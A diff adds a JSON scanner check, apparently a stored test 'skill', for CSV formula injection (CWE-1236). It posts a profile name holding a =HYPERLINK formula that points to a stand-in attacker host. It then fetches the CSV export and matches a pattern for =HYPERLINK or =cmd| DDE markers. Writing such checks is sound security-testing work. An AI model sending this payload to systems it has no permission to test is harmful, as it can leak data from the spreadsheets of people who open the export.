@@ -1,0 +1,39 @@
+{
+  "name": "web/CSV formula injection via export",
+  "description": "[mid] CSV/formula injection round-trip (CWE-1236; OWASP CSV Injection): a stored field starting with '=' re-enters the exported CSV unescaped, so the export cell executes as a spreadsheet formula (=HYPERLINK exfil). Keywords: csv formula injection export hyperlink dde spreadsheet owasp. ctrl: sanitized field loses the leading formula char -> not falsified. base_url = site root (copy skill to match store + export endpoints).",
+  "cwe": "CWE-1236",
+  "requests": {
+    "payload": {
+      "method": "POST",
+      "url": "{{base_url}}/api/profile",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": "{\"display_name\":\"=HYPERLINK(\\\"http://collab.attacker.example\\\",\\\"x9f\\\")\"}"
+    },
+    "check": {
+      "method": "GET",
+      "url": "{{base_url}}/export/users.csv"
+    }
+  },
+  "conditions": [
+    {
+      "type": "status",
+      "request": "check",
+      "equals": 200
+    },
+    {
+      "type": "body_regex",
+      "request": "check",
+      "pattern": "=HYPERLINK\\(|=cmd\\|"
+    }
+  ],
+  "params": [
+    "base_url"
+  ],
+  "source": "imported",
+  "successes": 1,
+  "id": "9a8dd7d8730c",
+  "created": "2026-11-06T00:00:00+00:00",
+  "last_used": "2026-11-06T00:00:00+00:00"
+}
